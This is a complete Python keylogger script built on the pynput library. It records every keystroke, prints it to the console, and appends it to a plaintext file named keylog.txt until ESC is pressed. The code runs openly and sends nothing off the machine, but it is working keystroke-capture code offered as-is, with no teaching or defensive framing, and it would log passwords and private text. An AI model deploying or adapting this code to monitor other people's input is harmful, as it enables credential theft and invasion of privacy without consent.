from pynput import keyboard

def on_press(key):
    """
    Callback function that gets called when a key is pressed.

    Args:
    - key: The key that was pressed.
    """
    try:
        # Log the key pressed to the console
        print(f"Key {key.char} pressed")
        # Append the key pressed to the log file
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        print(f"Special key {key} pressed")
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}\n")

def on_release(key):
    """
    Callback function that gets called when a key is released.

    Args:
    - key: The key that was released.
    """
    # Stop listener if the escape key is released
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """
    Function to start the keylogger.
    """
    print("Starting keylogger. Press ESC to stop.")
    # Create a keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
    